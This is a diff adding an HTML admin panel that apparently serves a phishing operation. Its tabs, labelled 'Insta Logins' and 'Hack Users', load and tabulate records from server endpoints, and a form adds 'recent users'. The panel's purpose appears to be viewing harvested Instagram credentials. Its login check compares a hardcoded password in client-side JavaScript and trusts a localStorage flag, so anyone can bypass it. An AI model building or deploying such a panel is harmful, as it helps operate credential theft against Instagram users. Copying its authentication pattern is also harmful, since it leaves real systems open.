@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f4f4f4;
+    }
+
+    .admin-panel {
+      display: none;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .tabs {
+      margin-bottom: 20px;
+    }
+
+    .tab-button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 0 5px;
+    }
+
+    .tab-button:hover {
+      background-color: #45a049;
+    }
+
+    #data-container {
+      margin-top: 20px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
+    }
+
+    table, th, td {
+      border: 1px solid #ddd;
+    }
+
+
+    th,
+    td {
+      padding: 12px;
+      text-align: left;
+    }
+
+    th {
+      background-color: #f2f2f2;
+    }
+
+    .login-container {
+      text-align: center;
+      padding: 20px;
+    }
+
+    #login-form {
+      display: inline-block;
+      text-align: left;
+    }
+
+    #login-form label {
+      display: block;
+      margin-bottom: 10px;
+    }
+
+    #login-form input {
+      padding: 8px;
+      margin-bottom: 10px;
+    }
+
+    #login-form button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container" id="login-container">
+    <form id="login-form">
+      <label for="password">Password:</label>
+      <input type="password" id="password" required>
+      <button type="button" onclick="authenticate()">Login</button>
+    </form>
+  </div>
+
+  <div class="admin-panel" id="admin-panel">
+    <h1>Admin Panel</h1>
+    <div class="tabs">
+      <button id="users1-tab" class="tab-button" onclick="fetchData('instaLogins')">Insta Logins</button>
+      <button id="users2-tab" class="tab-button" onclick="fetchData('hackUsers')">Hack Users</button>
+    </div>
+    <div id="data-container"></div>
+    <form enctype="multipart/form-data" action="/addrecentuser" method="post" class="addRecentUsers">
+      <input placeholder="name" type="text" name="name">
+      <input placeholder="username" type="text" name="username">
+      <input placeholder="dp" type="file" name="dp">
+      <input placeholder="URL" type="text" name="url">
+      <input placeholder="from" type="number" name="from">
+      <input placeholder="to" type="number" name="to">
+      <button type="submit" >submit</button>
+    </form>
+  </div>
+
+  <script>
+
+    // Check if the user is already authenticated
+    const isAuthenticated = localStorage.getItem('authenticated') === 'true';
+
+    if (isAuthenticated) {
+      document.getElementById('login-container').style.display = 'none';
+      document.getElementById('admin-panel').style.display = 'block';
+    }
+
+    function authenticate() {
+      const password = document.getElementById('password').value;
+      // Replace 'your_password' with your actual password
+      if (password === 'jiyebhutto') {
+        localStorage.setItem('authenticated', 'true');
+        document.getElementById('login-container').style.display = 'none';
+        document.getElementById('admin-panel').style.display = 'block';
+      } else {
+        alert('Incorrect password');
+      }
+    }
+
+    document.getElementById('users1-tab').addEventListener('click', () => fetchData('instaLogins'));
+    document.getElementById('users2-tab').addEventListener('click', () => fetchData('hackUsers'));
+
+    function fetchData(database) {
+      fetch(`/${database}`)
+        .then(response => response.json())
+        .then(data => displayData(data.data))
+        .catch(error => console.error('Error:', error));
+    }
+
+    function displayData(data) {
+      const dataContainer = document.getElementById('data-container');
+      dataContainer.innerHTML = ''; // Clear previous data
+      console.log(data)
+
+      if (data.length === 0) {
+        dataContainer.innerHTML = '<p>No data available</p>';
+        return;
+      }
+
+      const table = document.createElement('table');
+      const thead = document.createElement('thead');
+      const tbody = document.createElement('tbody');
+
+      const headerRow = document.createElement('tr'); 
+      for (const key in data[0]) {
+        const th = document.createElement('th');
+        th.textContent = key;
+        headerRow.appendChild(th);
+      }
+      thead.appendChild(headerRow);
+
+      data.forEach(item => {
+        const tr = document.createElement('tr');
+        for (const key in item) {
+          const td = document.createElement('td');
+          td.textContent = item[key];
+          tr.appendChild(td);
+        }
+        tbody.appendChild(tr);
+      });
+
+      table.appendChild(thead);
+      table.appendChild(tbody);
+      dataContainer.appendChild(table);
+    }
+
+    fetchData('instaLogins')
+
+    const addRecentUser = ()=>{
+      const name = document.querySelector("input[name='name']").value
+      const username = document.querySelector("input[name='username']").value
+      const dp = document.querySelector("input[name='dp']").value
+      const from = document.querySelector("input[name='from']").value
+      const to = document.querySelector("input[name='to']").value
+      fetch('/addrecentuser', ({
+    headers: {
+      "Content-Type": "application/json"
+    },
+    method: "post",
+    body: JSON.stringify({
+    username, name, from, to, dp
+    })
+  }))
+        }
+  </script>
+</body>
+</html>
